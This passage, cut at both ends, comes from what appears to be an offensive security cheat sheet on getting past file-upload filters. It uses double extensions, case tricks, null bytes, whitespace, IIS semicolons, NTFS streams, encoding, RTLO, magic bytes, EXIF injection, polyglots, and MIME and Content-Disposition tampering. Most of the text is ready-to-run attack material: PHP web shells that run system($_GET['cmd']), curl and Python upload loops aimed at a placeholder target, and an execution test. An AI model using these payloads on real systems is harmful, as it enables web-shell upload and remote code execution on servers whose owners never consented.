shell.jpg.png.gif.php
shell.php.abc.xyz.jpg

# === Upload and Test Triple Extensions ===
echo '<?php echo "TRIPLE_EXT_SUCCESS"; ?>' > /tmp/triple.php

TRIPLES=(
  "php.jpg.png"
  "php.gif.jpg"
  "jpg.php.png"
  "jpg.png.php"
  "php.xyz.jpg"
  "php.abc.xyz"
  "php.jpg.png.gif"
)

for combo in "${TRIPLES[@]}"; do
  FILENAME="test.$combo"
  cp /tmp/triple.php "$FILENAME"
  STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
    -F "file=@$FILENAME;type=image/jpeg" -b "session=COOKIE" 2>/dev/null)
  echo "$FILENAME → HTTP $STATUS"
  rm -f "$FILENAME"
done
```

```bash [Multi-Dot Confusion]
# === Excessive Dots ===
# Some parsers get confused with many consecutive dots
shell.php..jpg
shell.php...jpg
shell.php....jpg
shell..php.jpg
shell...php...jpg

# === Dot at End (Windows Strips Trailing Dots) ===
shell.php.jpg.
shell.php.jpg..
shell.php.jpg...
shell.php.
shell.php..

# === Dot at Beginning ===
.shell.php.jpg
..shell.php.jpg
.php.jpg

# === Only Dots Between Extensions ===
shell.php.........jpg

# === Upload Tests ===
DOT_PAYLOADS=(
  "shell.php..jpg"
  "shell.php...jpg"
  "shell..php.jpg"
  "shell.php.jpg."
  "shell.php.jpg.."
  ".shell.php.jpg"
  "shell.php.........jpg"
)

for payload in "${DOT_PAYLOADS[@]}"; do
  echo '<?php echo "DOT_CONFUSION"; ?>' > "$payload" 2>/dev/null
  if [ -f "$payload" ]; then
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
      -F "file=@$payload;type=image/jpeg" -b "session=COOKIE" 2>/dev/null)
    echo "$payload → HTTP $STATUS"
    rm -f "$payload"
  else
    echo "$payload → Cannot create locally (OS restriction)"
  fi
done
```
::

---

## Case Manipulation with Double Extensions

::note
Many extension blacklists are case-sensitive. Combining case variations with double extensions creates a powerful compound bypass.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Case Variation Payloads"}
  ```bash
  # === PHP Case Variations + Double Extension ===
  shell.PHP.jpg
  shell.Php.jpg
  shell.pHp.jpg
  shell.phP.jpg
  shell.PHp.jpg
  shell.PhP.jpg
  shell.pHP.jpg
  shell.pHp.JPG
  shell.PHP.JPG
  shell.Php.Jpg
  shell.pHp.jPg
  shell.PHP.PNG
  shell.Php.GIF

  # === PHTML Case Variations ===
  shell.PHTML.jpg
  shell.Phtml.jpg
  shell.pHtMl.jpg
  shell.PHTML.JPG

  # === PHAR Case Variations ===
  shell.PHAR.jpg
  shell.Phar.jpg
  shell.pHaR.jpg

  # === ASP Case Variations ===
  shell.ASP.jpg
  shell.Asp.jpg
  shell.aSP.jpg
  shell.ASPX.jpg
  shell.Aspx.jpg
  shell.aSpX.jpg

  # === JSP Case Variations ===
  shell.JSP.jpg
  shell.Jsp.jpg
  shell.jSP.jpg
  shell.JSPX.jpg

  # === Generate All Case Permutations Programmatically ===
  python3 << 'PYEOF'
  import itertools

  def case_permutations(ext):
      """Generate all case permutations of an extension"""
      if not ext:
          return ['']
      perms = []
      for combo in itertools.product(*[(c.lower(), c.upper()) for c in ext]):
          perms.append(''.join(combo))
      return perms

  # Generate for PHP
  php_perms = case_permutations('php')
  img_exts = ['jpg', 'png', 'gif']

  for php_case in php_perms:
      for img in img_exts:
          print(f"shell.{php_case}.{img}")
  
  print(f"\nTotal PHP case permutations: {len(php_perms)}")
  print(f"Total payloads: {len(php_perms) * len(img_exts)}")
  PYEOF

  # === Automated Case Fuzzing Script ===
  python3 << 'FUZZEOF'
  import requests
  import itertools

  url = "https://target.com/upload"
  cookies = {"session": "YOUR_SESSION"}

  shell_content = b'<?php echo md5("case_bypass_test"); ?>'

  def case_perms(s):
      return [''.join(c) for c in itertools.product(*[(ch.lower(), ch.upper()) for ch in s])]

  success = []
  for php_case in case_perms('php'):
      for img_ext in ['jpg', 'png', 'gif']:
          filename = f"test.{php_case}.{img_ext}"
          files = {"file": (filename, shell_content, "image/jpeg")}
          try:
              r = requests.post(url, files=files, cookies=cookies, timeout=5)
              status = "UPLOADED" if r.status_code == 200 else "BLOCKED"
              if status == "UPLOADED":
                  success.append(filename)
                  print(f"[+] {filename} → UPLOADED")
              else:
                  print(f"[-] {filename} → BLOCKED ({r.status_code})")
          except Exception as e:
              print(f"[!] {filename} → ERROR: {e}")

  print(f"\n=== {len(success)} successful uploads ===")
  for s in success:
      print(f"  → {s}")
  FUZZEOF
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Mixed Case Both Extensions"}
  ```bash
  # === Both Extensions with Case Variations ===
  # Targets filters that check both extensions case-sensitively
  
  shell.PHP.JPG
  shell.Php.Jpg
  shell.pHp.jPg
  shell.phP.jpG
  shell.PHP.PNG
  shell.Php.Png
  shell.pHp.pNg
  shell.PHP.GIF
  shell.Php.Gif
  shell.pHp.gIf

  # === Test if server is case-insensitive but app is case-sensitive ===
  # Step 1: Upload shell.PHP.jpg (uppercase PHP)
  echo '<?php echo "CASE_TEST"; ?>' > shell.PHP.jpg
  curl -X POST https://target.com/upload \
    -F "file=@shell.PHP.jpg;type=image/jpeg" \
    -b "session=COOKIE"

  # Step 2: Try accessing with different cases
  curl -s "https://target.com/uploads/shell.PHP.jpg"
  curl -s "https://target.com/uploads/shell.php.jpg"  # Lowercase redirect?
  curl -s "https://target.com/uploads/SHELL.PHP.JPG"  # Full uppercase

  # On case-insensitive filesystems (Windows/macOS):
  # All three URLs may resolve to the same file
  # On case-sensitive filesystems (Linux):
  # Only exact case match works
  ```
  :::
::

---

## Special Character Double Extension Attacks

Injecting special characters between, before, after, or within the extensions can disrupt parser logic.

::accordion
  :::accordion-item{icon="i-lucide-terminal" label="Null Byte + Double Extension"}
  ```bash
  # === Null Byte Injection with Double Extensions ===
  # Null byte (\x00 or %00) terminates C-style strings
  # Server saves: shell.php (truncated at null byte)
  # App validates: shell.php%00.jpg → sees .jpg → allows

  # URL-encoded null byte between extensions
  shell.php%00.jpg
  shell.php%00.png
  shell.php%00.gif
  shell.php%00.bmp

  # Double URL-encoded null byte
  shell.php%2500.jpg
  shell.php%2500.png

  # Null byte with double extensions
  shell.php%00.jpg.png
  shell.php.jpg%00.php

  # === Python Upload with Real Null Byte ===
  python3 << 'NULLEOF'
  import requests

  url = "https://target.com/upload"
  cookies = {"session": "YOUR_SESSION"}
  shell = b'<?php echo md5("null_byte_double_ext"); ?>'

  payloads = [
      "shell.php\x00.jpg",
      "shell.php\x00.png",
      "shell.php\x00.gif",
      "shell.php\x00.jpg.png",
      "shell.phtml\x00.jpg",
      "shell.phar\x00.jpg",
  ]

  for filename in payloads:
      files = {"file": (filename, shell, "image/jpeg")}
      try:
          r = requests.post(url, files=files, cookies=cookies, timeout=5)
          print(f"{repr(filename)} → HTTP {r.status_code}")
      except Exception as e:
          print(f"{repr(filename)} → ERROR: {e}")
  NULLEOF

  # === Curl with Null Byte ===
  # Create file with null byte in name
  python3 -c "open('shell.php\x00.jpg','w').write('<?php system(\$_GET[\"cmd\"]); ?>')"
  # Note: Most filesystems don't allow null bytes in filenames
  # The null byte must be injected at the HTTP protocol level
  
  # Using Burp Suite:
  # 1. Intercept upload request
  # 2. Find filename="shell.php.jpg"
  # 3. Insert null byte between .php and .jpg
  # 4. In Hex tab: insert 00 byte at the right position
  # 5. Forward the request

  # === Works on ===
  # PHP < 5.3.4 (fixed null byte handling)
  # Older Java servlets
  # Some Node.js filename parsers
  # Custom applications with C-based string handling
  ```
  :::

  :::accordion-item{icon="i-lucide-terminal" label="Whitespace + Double Extension"}
  ```bash
  # === Space Characters Between Extensions ===
  # Windows strips trailing spaces from filenames
  # Some parsers ignore embedded spaces

  # Trailing space after executable extension
  "shell.php .jpg"
  "shell.php  .jpg"
  "shell.php   .jpg"

  # Space before dot
  "shell.php .jpg"
  "shell .php.jpg"

  # Tab character
  "shell.php\t.jpg"

  # URL-encoded space
  shell.php%20.jpg
  shell.php%20%20.jpg

  # URL-encoded tab
  shell.php%09.jpg

  # Trailing space (Windows strips)
  shell.php.jpg%20
  shell.php%20.jpg%20
  shell.php.jpg%20%20%20

  # === Newline/Carriage Return Injection ===
  shell.php%0a.jpg          # Line feed
  shell.php%0d.jpg          # Carriage return
  shell.php%0d%0a.jpg       # CRLF
  shell.php%0a%0d.jpg       # LFCR

  # === Upload Testing with Whitespace ===
  python3 << 'WSEOF'
  import requests

  url = "https://target.com/upload"
  cookies = {"session": "YOUR_SESSION"}
  shell = b'<?php echo "WHITESPACE_BYPASS"; ?>'

  whitespace_payloads = [
      "shell.php .jpg",         # Space between
      "shell.php  .jpg",        # Double space
      "shell.php\t.jpg",        # Tab
      "shell.php\n.jpg",        # Newline
      "shell.php\r.jpg",        # Carriage return
      "shell.php\r\n.jpg",      # CRLF
      "shell.php .jpg ",        # Trailing space
      " shell.php.jpg",         # Leading space
      "shell.php\x0b.jpg",      # Vertical tab
      "shell.php\x0c.jpg",      # Form feed
      "shell.php\xa0.jpg",      # Non-breaking space (Latin-1)
  ]

  for filename in whitespace_payloads:
      files = {"file": (filename, shell, "image/jpeg")}
      try:
          r = requests.post(url, files=files, cookies=cookies, timeout=5)
          safe_name = repr(filename)
          print(f"{safe_name} → HTTP {r.status_code}")
      except Exception as e:
          print(f"{repr(filename)} → ERROR: {e}")
  WSEOF
  ```
  :::

  :::accordion-item{icon="i-lucide-terminal" label="Semicolon & Colon + Double Extension"}
  ```bash
  # === IIS Semicolon Truncation + Double Extension ===
  # IIS 6.0+ treats semicolon as parameter separator in URLs
  # Filename: shell.asp;.jpg → IIS processes as shell.asp

  shell.asp;.jpg
  shell.asp;.png
  shell.asp;.gif
  shell.asp;test.jpg
  shell.asp;anything.jpg
  shell.aspx;.jpg
  shell.aspx;test.jpg
  shell.cer;.jpg
  shell.asa;.jpg

  # PHP semicolon variations (rarely works but worth testing)
  shell.php;.jpg
  shell.php;test.jpg
  shell.phtml;.jpg

  # === Windows NTFS Alternate Data Streams (ADS) ===
  # Colon creates ADS on Windows/IIS
  shell.php::$DATA
  shell.php::$DATA.jpg
  shell.asp::$DATA
  shell.asp::$DATA.jpg
  shell.aspx::$DATA
  shell.aspx::$DATA.jpg

  # ADS with double extension
  shell.php::$DATA.jpg
  shell.php:test.jpg
  shell.asp::$INDEX_ALLOCATION.jpg

  # === Upload Tests ===
  # Semicolon test
  echo '<% Response.Write("SEMICOLON_BYPASS") %>' > "shell.asp"
  curl -X POST https://target.com/upload \
    -F 'file=@shell.asp;filename=shell.asp;.jpg' \
    -F 'type=image/jpeg' \
    -b "session=COOKIE" -v

  # ADS test
  curl -X POST https://target.com/upload \
    -F 'file=@shell.php;filename=shell.php::$DATA.jpg' \
    -F 'type=image/jpeg' \
    -b "session=COOKIE" -v

  # Batch semicolon testing
  PAYLOADS=(
    "shell.asp;.jpg"
    "shell.asp;test.jpg"
    "shell.aspx;.jpg"
    "shell.php;.jpg"
    "shell.cer;.jpg"
    "shell.asp;.png"
  )
  for p in "${PAYLOADS[@]}"; do
    echo '<% Response.Write("EXEC") %>' > /tmp/semi_test
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
      -F "file=@/tmp/semi_test;filename=$p;type=image/jpeg" -b "session=COOKIE" 2>/dev/null)
    echo "$p → HTTP $STATUS"
  done
  ```
  :::

  :::accordion-item{icon="i-lucide-terminal" label="URL Encoding + Double Extension"}
  ```bash
  # === URL-Encoded Extension Characters ===
  # Encode the dots and extension characters

  # Encoded dot (%2e)
  shell%2ephp.jpg          # shell.php.jpg with encoded first dot
  shell.php%2ejpg          # shell.php.jpg with encoded second dot
  shell%2ephp%2ejpg        # Both dots encoded

  # Encoded 'p', 'h' in php
  shell.%70%68%70.jpg      # Full URL-encoded "php"
  shell.p%68p.jpg          # Partially encoded
  shell.ph%70.jpg          # Partially encoded
  shell.%70hp.jpg          # Partially encoded

  # Double URL-encoded
  shell.php%252ejpg        # %252e decodes to %2e then to .
  shell%252ephp.jpg
  shell.%2570%2568%2570.jpg  # Double-encoded php

  # Unicode dot equivalents
  shell.php\u002ejpg       # Unicode dot
  shell.php\uff0ejpg       # Fullwidth dot (．)

  # === Upload with Encoded Extensions ===
  python3 << 'ENCEOF'
  import requests
  from urllib.parse import quote

  url = "https://target.com/upload"
  cookies = {"session": "YOUR_SESSION"}
  shell = b'<?php echo "URL_ENCODE_BYPASS"; ?>'

  encoded_payloads = [
      "shell%2ephp.jpg",
      "shell.php%2ejpg",
      "shell%2ephp%2ejpg",
      "shell.%70%68%70.jpg",
      "shell.p%68p.jpg",
      "shell.ph%70.jpg",
      "shell.%70hp.jpg",
      "shell.php%252ejpg",
      "shell.php\uff0ejpg",     # Fullwidth dot
      "shell.php%e0%80%ae.jpg",  # Overlong UTF-8 dot
      "shell.php%c0%ae.jpg",     # Overlong UTF-8 dot (2-byte)
  ]

  for filename in encoded_payloads:
      files = {"file": (filename, shell, "image/jpeg")}
      try:
          r = requests.post(url, files=files, cookies=cookies, timeout=5)
          print(f"{filename} → HTTP {r.status_code}")
      except Exception as e:
          print(f"{filename} → ERROR: {e}")
  ENCEOF
  ```
  :::

  :::accordion-item{icon="i-lucide-terminal" label="Backslash & Path Separator + Double Extension"}
  ```bash
  # === Backslash (Windows Path Separator) ===
  # Some applications normalize backslash to forward slash
  # Others strip path components but keep the filename
  
  shell.php\.jpg
  shell.php\\.jpg
  shell.php\..\.jpg
  uploads\shell.php.jpg
  ..\\shell.php.jpg
  ....\\\\shell.php.jpg

  # === Forward Slash in Filename ===
  shell.php/.jpg           # Slash may be treated as directory separator
  shell.php/x.jpg          # Path traversal within filename
  shell.php/../shell.php.jpg

  # === URL-Encoded Path Separators ===
  shell.php%2f.jpg         # Encoded forward slash
  shell.php%5c.jpg         # Encoded backslash
  shell.php%2f%2e.jpg      # Encoded /. 
  
  # === Upload Testing ===
  python3 << 'PATHEOF'
  import requests

  url = "https://target.com/upload"
  cookies = {"session": "YOUR_SESSION"}
  shell = b'<?php echo "PATH_SEP_BYPASS"; ?>'

  path_payloads = [
      "shell.php\\.jpg",
      "shell.php/.jpg",
      "shell.php%2f.jpg",
      "shell.php%5c.jpg",
      "..\\shell.php.jpg",
      "../shell.php.jpg",
      "shell.php/x.jpg",
      "uploads/shell.php.jpg",
  ]

  for filename in path_payloads:
      files = {"file": (filename, shell, "image/jpeg")}
      try:
          r = requests.post(url, files=files, cookies=cookies, timeout=5)
          print(f"{repr(filename)} → HTTP {r.status_code}")
      except Exception as e:
          print(f"{repr(filename)} → ERROR: {e}")
  PATHEOF
  ```
  :::

  :::accordion-item{icon="i-lucide-terminal" label="Unicode & Encoding Double Extension Tricks"}
  ```bash
  # === Right-to-Left Override (RTLO) ===
  # Unicode character U+202E reverses text display direction
  # Displayed: shellgpj.php
  # Actual:    shell[RTLO]php.jpg → filesystem sees shell + reversed "php.jpg"
  
  python3 << 'RTLOEOF'
  import requests

  url = "https://target.com/upload"
  cookies = {"session": "YOUR_SESSION"}
  shell = b'<?php echo "RTLO_BYPASS"; ?>'

  rtlo = '\u202e'
  
  # Appears as: shellgpj.php (displays reversed)
  # But the actual bytes contain: shell + RTLO + php.jpg
  filename1 = f"shell{rtlo}gpj.php"
  
  # Another RTLO trick
  filename2 = f"shell{rtlo}gpj.phtml"
  
  # Left-to-Right Override (U+202D) combined
  lro = '\u202d'
  filename3 = f"shell.php{rtlo}{lro}.jpg"

  for filename in [filename1, filename2, filename3]:
      files = {"file": (filename, shell, "image/jpeg")}
      try:
          r = requests.post(url, files=files, cookies=cookies, timeout=5)
          print(f"{repr(filename)} → HTTP {r.status_code}")
      except Exception as e:
          print(f"{repr(filename)} → ERROR: {e}")
  RTLOEOF

  # === Unicode Normalization Attacks ===
  # Some servers normalize Unicode characters to ASCII equivalents
  
  python3 << 'UNIEOF'
  import requests
  import unicodedata

  url = "https://target.com/upload"
  cookies = {"session": "YOUR_SESSION"}
  shell = b'<?php echo "UNICODE_BYPASS"; ?>'

  # Unicode characters that may normalize to ASCII
  unicode_payloads = [
      # Fullwidth characters (normalize to ASCII in NFKC/NFKD)
      "shell.\uff50\uff48\uff50.jpg",     # ．ｐｈｐ (fullwidth php)
      "shell.php\uff0ejpg",               # ．(fullwidth dot)
      
      # Circled letters
      "shell.\u24c5\u24bd\u24c5.jpg",     # ⓅⒽⓅ (circled PHP)
      
      # Superscript
      "shell.p\u02b0p.jpg",               # pʰp (superscript h)
      
      # Mathematical variants
      "shell.\U0001d429\U0001d421\U0001d429.jpg",  # 𝐩𝐡𝐩 (math bold)
      
      # Homoglyphs (visually similar characters)
      "shell.p\u0570p.jpg",               # Armenian 'h' looks like 'h'
      "shell.\u0440\u04bb\u0440.jpg",      # Cyrillic chars resembling 'php'
  ]

  for filename in unicode_payloads:
      # Show what it normalizes to
      normalized = unicodedata.normalize('NFKC', filename)
      files = {"file": (filename, shell, "image/jpeg")}
      try:
          r = requests.post(url, files=files, cookies=cookies, timeout=5)
          print(f"Original: {repr(filename)}")
          print(f"NFKC:     {normalized}")
          print(f"Result:   HTTP {r.status_code}\n")
      except Exception as e:
          print(f"{repr(filename)} → ERROR: {e}\n")
  UNIEOF
  ```
  :::
::

---

## Double Extension + Magic Bytes Combined

::tip
The most robust bypass combines double extension bypass with magic bytes prepending. This defeats both extension validation AND content/magic byte validation simultaneously.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Magic Bytes + Double Ext Shells"}
  ```bash
  # === GIF89a Header + PHP + Double Extension ===
  printf 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.php.gif
  file shell.php.gif
  # Output: GIF image data, version 89a
  
  curl -X POST https://target.com/upload \
    -F "file=@shell.php.gif;type=image/gif" \
    -b "session=COOKIE"

  # === JPEG Header + PHP + Double Extension ===
  printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00<?php system($_GET["cmd"]); ?>' > shell.php.jpg
  file shell.php.jpg
  # Output: JPEG image data, JFIF standard
  
  curl -X POST https://target.com/upload \
    -F "file=@shell.php.jpg;type=image/jpeg" \
    -b "session=COOKIE"

  # === PNG Header + PHP + Double Extension ===
  printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.php.png
  file shell.php.png
  # Output: PNG image data
  
  curl -X POST https://target.com/upload \
    -F "file=@shell.php.png;type=image/png" \
    -b "session=COOKIE"

  # === BMP Header + PHP + Double Extension ===
  printf 'BM\x00\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00<?php system($_GET["cmd"]); ?>' > shell.php.bmp
  file shell.php.bmp
  
  curl -X POST https://target.com/upload \
    -F "file=@shell.php.bmp;type=image/bmp" \
    -b "session=COOKIE"

  # === PDF Header + PHP + Double Extension ===
  printf '%%PDF-1.4\n<?php system($_GET["cmd"]); ?>\n%%%%EOF' > shell.php.pdf
  file shell.php.pdf
  # Output: PDF document, version 1.4
  
  curl -X POST https://target.com/upload \
    -F "file=@shell.php.pdf;type=application/pdf" \
    -b "session=COOKIE"

  # === Batch Generate All Combinations ===
  python3 << 'MAGICEOF'
  import os

  magic_bytes = {
      'gif': b'GIF89a\n',
      'jpg': b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00',
      'png': b'\x89PNG\r\n\x1a\n',
      'bmp': b'BM\x00\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00',
      'pdf': b'%PDF-1.4\n',
      'zip': b'PK\x03\x04',
  }

  php_exts = ['php', 'php5', 'phtml', 'phar', 'pht', 'php7']
  img_exts = ['jpg', 'png', 'gif', 'bmp', 'pdf']

  shell = b'<?php echo md5("magic_double_ext"); system($_GET["cmd"]); ?>'

  count = 0
  for php_ext in php_exts:
      for img_ext in img_exts:
          filename = f"shell.{php_ext}.{img_ext}"
          magic = magic_bytes.get(img_ext, b'')
          content = magic + shell
          
          with open(filename, 'wb') as f:
              f.write(content)
          
          # Verify magic bytes
          result = os.popen(f'file {filename}').read().strip()
          print(f"Created: {filename} → {result}")
          count += 1

  print(f"\nTotal payloads created: {count}")
  MAGICEOF
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="EXIF Injection + Double Ext"}
  ```bash
  # === Inject PHP into EXIF of Real Image + Double Extension ===
  # This creates a VALID image that also contains executable PHP
  # Combined with double extension for maximum bypass

  # Step 1: Create a small legitimate image
  python3 -c "
  from PIL import Image
  img = Image.new('RGB', (100, 100), color='red')
  img.save('legit.jpg', 'JPEG')
  print('Created legit.jpg')
  "

  # Step 2: Inject PHP into EXIF Comment
  exiftool -Comment='<?php system($_GET["cmd"]); ?>' legit.jpg
  
  # Step 3: Rename with double extension
  cp legit.jpg shell.php.jpg

  # Verify
  file shell.php.jpg
  # Output: JPEG image data (valid image!)
  exiftool shell.php.jpg | grep Comment
  # Output: Comment: <?php system($_GET["cmd"]); ?>
  strings shell.php.jpg | grep "php"

  # Step 4: Upload
  curl -X POST https://target.com/upload \
    -F "file=@shell.php.jpg;type=image/jpeg" \
    -b "session=COOKIE"

  # === Multiple EXIF Fields ===
  exiftool \
    -Comment='<?php system($_GET["cmd"]); ?>' \
    -Artist='<?php system($_GET["cmd"]); ?>' \
    -ImageDescription='<?php system($_GET["cmd"]); ?>' \
    -UserComment='<?php system($_GET["cmd"]); ?>' \
    -DocumentName='<?php echo shell_exec($_GET["cmd"]); ?>' \
    -Copyright='<?php passthru($_GET["cmd"]); ?>' \
    legit.jpg

  cp legit.jpg shell.php.jpg
  cp legit.jpg shell.phtml.jpg
  cp legit.jpg shell.php5.jpg
  cp legit.jpg shell.phar.jpg

  # Upload each variant
  for f in shell.php.jpg shell.phtml.jpg shell.php5.jpg shell.phar.jpg; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
      -F "file=@$f;type=image/jpeg" -b "session=COOKIE" 2>/dev/null)
    echo "$f → HTTP $STATUS"
  done

  # === EXIF + Unknown Extension Fallback ===
  cp legit.jpg shell.php.xyz
  cp legit.jpg shell.php.abc
  cp legit.jpg shell.php.fakext

  for f in shell.php.xyz shell.php.abc shell.php.fakext; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
      -F "file=@$f;type=application/octet-stream" -b "session=COOKIE" 2>/dev/null)
    echo "$f → HTTP $STATUS"
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Polyglot + Double Extension"}
  ```bash
  # === Create JPEG/PHP Polyglot with Double Extension ===
  # A file that is simultaneously valid JPEG AND valid PHP
  
  python3 << 'POLYEOF'
  import struct
  import zlib

  # JPEG structure with PHP in COM (comment) marker
  jpeg = bytearray()
  
  # SOI (Start of Image)
  jpeg += b'\xff\xd8'
  
  # APP0 (JFIF header)
  jpeg += b'\xff\xe0'
  jpeg += struct.pack('>H', 16)
  jpeg += b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
  
  # COM (Comment) marker with PHP payload
  php_payload = b'<?php system($_GET["cmd"]); ?>'
  jpeg += b'\xff\xfe'
  jpeg += struct.pack('>H', len(php_payload) + 2)
  jpeg += php_payload
  
  # SOF0 (Start of Frame — minimal 1x1 pixel)
  jpeg += b'\xff\xc0'
  jpeg += b'\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00'
  
  # DHT (Huffman Table — minimal)
  jpeg += b'\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b'
  
  # SOS (Start of Scan)
  jpeg += b'\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00\x7b\x40'
  
  # EOI (End of Image)
  jpeg += b'\xff\xd9'

  # Save with double extension variants
  variants = [
      'polyglot.php.jpg',
      'polyglot.phtml.jpg',
      'polyglot.php5.jpg',
      'polyglot.php.gif',    # Wrong magic for gif but tests extension check
      'polyglot.php.xyz',    # Unknown extension fallback
      'polyglot.php.abc',
  ]

  for name in variants:
      with open(name, 'wb') as f:
          f.write(jpeg)
      print(f"Created {name} ({len(jpeg)} bytes)")

  # Verify it's a valid JPEG
  import subprocess
  result = subprocess.run(['file', 'polyglot.php.jpg'], capture_output=True, text=True)
  print(f"\nFile type: {result.stdout.strip()}")
  
  # Verify PHP payload is present
  with open('polyglot.php.jpg', 'rb') as f:
      content = f.read()
  print(f"Contains PHP: {'system' in content.decode('latin-1')}")
  POLYEOF

  # Upload polyglot with double extension
  curl -X POST https://target.com/upload \
    -F "file=@polyglot.php.jpg;type=image/jpeg" \
    -b "session=COOKIE" -v

  # Test execution
  curl "https://target.com/uploads/polyglot.php.jpg?cmd=id"
  ```
  :::
::

---

## Double Extension + MIME Type Spoofing

::note
Combining double extension with MIME type manipulation defeats multi-layer validation that checks both the extension AND the Content-Type header.
::

::code-group
```bash [MIME Combinations]
# === Double Extension with Correct Image MIME ===
# Most applications check Content-Type header for image/*
# Setting the right MIME type with double extension bypasses both checks

# PHP double ext + image MIME types
echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg
curl -X POST https://target.com/upload \
  -F "file=@shell.php.jpg;type=image/jpeg" -b "session=COOKIE"

curl -X POST https://target.com/upload \
  -F "file=@shell.php.jpg;type=image/png" -b "session=COOKIE"

curl -X POST https://target.com/upload \
  -F "file=@shell.php.jpg;type=image/gif" -b "session=COOKIE"

curl -X POST https://target.com/upload \
  -F "file=@shell.php.jpg;type=image/webp" -b "session=COOKIE"

curl -X POST https://target.com/upload \
  -F "file=@shell.php.jpg;type=image/bmp" -b "session=COOKIE"

# === Double Extension with Generic MIME ===
curl -X POST https://target.com/upload \
  -F "file=@shell.php.jpg;type=application/octet-stream" -b "session=COOKIE"

curl -X POST https://target.com/upload \
  -F "file=@shell.php.jpg;type=text/plain" -b "session=COOKIE"

# === Automated MIME + Double Extension Matrix ===
MIMES="image/jpeg image/png image/gif image/bmp image/webp image/svg+xml text/plain application/octet-stream application/pdf"
FILENAMES="shell.php.jpg shell.php.png shell.php.gif shell.phtml.jpg shell.php5.jpg shell.php.xyz"

for fname in $FILENAMES; do
  echo '<?php echo md5("mime_double_ext"); ?>' > "$fname"
  for mime in $MIMES; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
      -F "file=@$fname;type=$mime" -b "session=COOKIE" 2>/dev/null)
    if [ "$STATUS" = "200" ]; then
      echo "[UPLOADED] $fname | MIME: $mime → HTTP $STATUS"
    fi
  done
  rm -f "$fname"
done
```

```bash [Content-Type Header Tricks + Double Ext]
# === Double Content-Type Header ===
# Some parsers check first Content-Type, app checks second (or vice versa)
# Must be done via Burp Suite or raw HTTP

# In Burp Suite, modify the multipart part header:
# Content-Disposition: form-data; name="file"; filename="shell.php.jpg"
# Content-Type: image/jpeg
# Content-Type: application/x-httpd-php
#
# Some frameworks take the LAST Content-Type

# === Capitalization Tricks ===
# content-type: image/jpeg       (lowercase)
# Content-type: image/jpeg       (mixed)
# CONTENT-TYPE: image/jpeg       (uppercase)
# Content-Type : image/jpeg      (space before colon)
# Content-Type:image/jpeg        (no space after colon)

# === MIME with Parameters ===
# Content-Type: image/jpeg; charset=utf-8
# Content-Type: image/jpeg; boundary=something
# Content-Type: image/jpeg; name="shell.php"

# === Python Script for Header Manipulation ===
python3 << 'MIMEEOF'
import requests
import io

url = "https://target.com/upload"
cookies = {"session": "YOUR_SESSION"}
shell = b'<?php echo md5("content_type_bypass"); ?>'

# Test different Content-Type header cases
# Note: requests library normalizes headers, so use raw sockets for some tests

tests = [
    ("shell.php.jpg", "image/jpeg"),
    ("shell.php.jpg", "image/png"),
    ("shell.php.jpg", "image/gif"),
    ("shell.php.jpg", "application/octet-stream"),
    ("shell.php.jpg", "text/plain"),
    ("shell.php.jpg", "image/jpeg; charset=utf-8"),
    ("shell.php.jpg", "image/jpeg; name=shell.php"),
    ("shell.php.png", "image/jpeg"),  # Mismatched ext/MIME
    ("shell.php.gif", "image/jpeg"),  # Mismatched ext/MIME
]

for filename, mime in tests:
    files = {"file": (filename, io.BytesIO(shell), mime)}
    try:
        r = requests.post(url, files=files, cookies=cookies, timeout=5)
        status = "PASS" if r.status_code == 200 else "FAIL"
        print(f"[{status}] {filename} | {mime} → HTTP {r.status_code}")
    except Exception as e:
        print(f"[ERR]  {filename} | {mime} → {e}")
MIMEEOF
```
::

---

## Double Extension + Content-Disposition Manipulation

::warning
The `Content-Disposition` header in multipart uploads defines the filename. Manipulating this header with double extensions creates powerful bypass combinations.
::

::code-collapse
```bash [Content-Disposition Attack Payloads]
# === All Techniques Must Be Applied in Burp Suite or Raw HTTP ===
# Intercept the upload request and modify the Content-Disposition header

# === Standard double extension in Content-Disposition ===
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"

# === Double filename parameter (parser takes first or last) ===
Content-Disposition: form-data; name="file"; filename="safe.jpg"; filename="shell.php.jpg"
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"; filename="safe.jpg"

# === Filename with quotes variations ===
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"
Content-Disposition: form-data; name="file"; filename='shell.php.jpg'
Content-Disposition: form-data; name="file"; filename=shell.php.jpg
Content-Disposition: form-data; name="file"; filename="shell.php".jpg
Content-Disposition: form-data; name="file"; filename="shell.php"."jpg"

# === RFC 5987 filename* encoding ===
Content-Disposition: form-data; name="file"; filename*=UTF-8''shell.php.jpg
Content-Disposition: form-data; name="file"; filename="safe.jpg"; filename*=UTF-8''shell.php.jpg
# Some parsers prefer filename* over filename

# === Filename with path components ===
